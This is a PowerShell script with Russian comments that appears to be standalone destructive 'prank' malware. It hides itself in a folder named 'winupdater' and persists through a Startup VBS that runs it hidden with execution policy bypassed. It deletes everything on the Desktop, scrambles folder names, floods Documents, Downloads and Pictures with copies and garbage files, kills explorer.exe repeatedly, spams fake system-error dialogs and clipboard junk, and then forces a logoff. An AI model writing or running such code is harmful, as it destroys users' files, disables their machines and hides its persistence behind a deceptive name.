# === Спрятать себя в скрытую папку и запустить оттуда ===
$hiddenDir = "$env:APPDATA\Microsoft\Windows\winupdater"
$autostart = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdater.vbs"
if (-not (Test-Path $hiddenDir)) {
    New-Item -ItemType Directory -Force -Path $hiddenDir | Out-Null
}
$selfPath = "$hiddenDir\winupdater.ps1"
Copy-Item -Path $MyInvocation.MyCommand.Definition -Destination $selfPath -Force

# Добавление в автозагрузку через VBS (обходит блокировку .ps1)
$vbs = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -windowstyle hidden -ExecutionPolicy Bypass -File `"$selfPath`"", 0
"@
Set-Content -Path $autostart -Value $vbs -Encoding ASCII

# === Очистка Desktop ===
Remove-Item "$env:USERPROFILE\Desktop\*" -Recurse -Force -ErrorAction SilentlyContinue

# === Перемешка названий папок на Desktop ===
$folders = Get-ChildItem "$env:USERPROFILE\Desktop" -Directory
$names = $folders.Name | Sort-Object {Get-Random}
for ($i = 0; $i -lt $folders.Count; $i++) {
    $tempName = "temp_$([System.Guid]::NewGuid().ToString().Substring(0, 5))"
    Rename-Item $folders[$i].FullName $tempName
}
$renamed = Get-ChildItem "$env:USERPROFILE\Desktop" -Directory
for ($i = 0; $i -lt $renamed.Count; $i++) {
    Rename-Item $renamed[$i].FullName $names[$i]
}

# === Копии файлов + беспорядок в других папках ===
$targets = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\Pictures"
)
foreach ($t in $targets) {
    if (Test-Path $t) {
        Get-ChildItem $t -File | ForEach-Object {
            Copy-Item $_.FullName -Destination "$t\$($_.BaseName)_COPY$($_.Extension)" -Force
        }
    }
}

# === Перевернуть экран
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('^{%DOWN}')

# === Фоновые задачи ===
Start-Job -ScriptBlock {
    while ($true) { taskkill /f /im explorer.exe; Start-Sleep 5 }
}
Start-Job -ScriptBlock {
    $wsh = New-Object -ComObject WScript.Shell
    while ($true) { $wsh.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 100 }
}
Start-Job -ScriptBlock {
    $path = "$env:USERPROFILE\Desktop\maze"
    for ($i=0;$i -lt 100;$i++) { $path += "\$i"; New-Item -Path $path -ItemType Directory -Force | Out-Null }
}
Add-Type -AssemblyName PresentationFramework
Start-Job -ScriptBlock {
    while ($true) {
        [System.Windows.MessageBox]::Show('System Error! Contact your Admin!','Critical Error','OK','Error') | Out-Null
        Start-Sleep -Milliseconds 500
    }
}
Start-Job -ScriptBlock {
    for ($i=0;$i -lt 500;$i++) {
        $folder = Get-Random -InputObject $targets
        New-Item "$folder\garbage_$i.txt" -Value "LOL" | Out-Null
    }
}
Start-Job -ScriptBlock {
    while ($true) {
        Set-Clipboard -Value ('HAHAHA'*(Get-Random -Minimum 100 -Maximum 1000))
        Start-Sleep -Milliseconds 100
    }
}

# 5 минут адского веселья
Start-Sleep -Seconds 300
shutdown /l /f
